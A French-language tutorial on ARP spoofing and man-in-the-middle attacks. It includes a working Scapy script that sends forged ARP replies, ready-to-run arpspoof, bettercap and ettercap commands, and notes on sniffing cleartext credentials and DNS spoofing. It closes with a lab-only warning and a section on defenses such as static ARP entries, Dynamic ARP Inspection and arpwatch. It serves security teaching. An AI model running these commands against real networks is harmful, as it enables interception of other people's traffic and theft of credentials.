# ARP spoofing / MITM

ARP n'a aucune authentification. Une machine demande « qui a 192.168.1.1 ? » et
fait confiance à la première réponse venue. Si je réponds plus vite (ou si je
réponds en boucle), je peux dire à une victime que *mon* adresse MAC possède
l'IP de la passerelle. Son trafic passe alors par moi, et je suis au milieu.

> Lab / réseaux autorisés uniquement. Intercepter le trafic d'un réseau qui ne
> t'appartient pas ou que tu n'es pas explicitement autorisé à tester est
> illégal presque partout. Tout ce qui suit est pour ton propre lab.

## 1. Le principe

Deux caches ARP à empoisonner, les deux sens de la conversation :

- dire à la **victime** : « l'IP de la passerelle est à mon MAC »
- dire à la **passerelle** : « l'IP de la victime est à mon MAC »

Les deux m'envoient maintenant leurs paquets. Si je les relaie, aucun des deux ne
s'en aperçoit — c'est la différence entre un MITM propre et une simple coupure.

## 2. Mise en place

Il faut être sur le même réseau de niveau 2 (même LAN / Wi-Fi) que la cible, et
relayer le trafic, donc on active d'abord le forwarding IP :

```
sudo sysctl -w net.ipv4.ip_forward=1
```

On récupère ce qu'il faut : ton interface, l'IP de la passerelle, l'IP de la
victime, et leurs MAC (`ip neigh`, ou un `arp-scan -l`).

## 3. Empoisonner les caches (le mécanisme)

Une réponse ARP (`op=2`) est non sollicitée mais acceptée quand même. La voici à
la main avec Scapy, la façon la plus claire de voir ce qui se passe :

```python
from scapy.all import ARP, send

victim  = "192.168.1.50";  victim_mac  = "aa:bb:cc:dd:ee:01"
gateway = "192.168.1.1";   gateway_mac = "aa:bb:cc:dd:ee:02"

# victime <- "je suis la passerelle"
send(ARP(op=2, pdst=victim,  hwdst=victim_mac,  psrc=gateway), inter=2, loop=1)
# passerelle <- "je suis la victime"
send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=victim),  inter=2, loop=1)
```

On répète les réponses (toutes les deux secondes) parce que les vraies machines
refont des requêtes ARP et se corrigeraient sinon.

Quand tu arrêtes, **restaure** les caches pour ne pas laisser la victime hors
ligne — renvoie les bonnes associations plusieurs fois avec les vrais MAC.

## 4. Avec des outils

En pratique je prends un outil. Au choix :

```
# dsniff
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50     # l'autre sens

# bettercap (fait le forwarding + la restauration pour toi)
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> net.sniff on

# ettercap
ettercap -T -i eth0 -M arp /192.168.1.50// /192.168.1.1//
```

Puis on observe le trafic dans Wireshark ou `tcpdump -i eth0`.

## 5. Ce que ça donne, et les limites

Une fois au milieu, tu peux :

- **sniffer le clair** — tout ce qui n'est pas chiffré (vieux HTTP, FTP, Telnet,
  SNMP, SMTP/POP/IMAP en clair) te livre identifiants et contenu directement.
- **DNS spoofing** — répondre aux requêtes DNS avec ta propre IP pour rediriger
  un domaine.
- **downgrade / strip** — historiquement le SSL-strip, aujourd'hui largement
  contré par le HTTPS partout + HSTS.

La limite honnête : TLS. Le trafic HTTPS moderne reste chiffré même en passant
par toi — tu vois *qui* parle à *quoi* (SNI, IP), pas le contenu. Le MITM brille
sur les réseaux plats avec des protocoles internes ou legacy en clair, et c'est
exactement pour ça qu'ils comptent encore.

## 6. Détecter et se défendre

- **Entrées ARP statiques** pour les hôtes critiques (passerelle) — non
  écrasables.
- **Dynamic ARP Inspection (DAI)** + DHCP snooping sur switches managés —
  jettent les fausses réponses.
- **Port security** limite les MAC par port.
- **arpwatch** alerte quand le MAC d'une IP change soudainement.
- Et le vrai filet de sécurité : **du chiffrement partout** (TLS, SSH, VPN),
  pour qu'être au milieu serve à beaucoup moins.

---

Fait par **White** · [github.com/white-exee](https://github.com/white-exee)
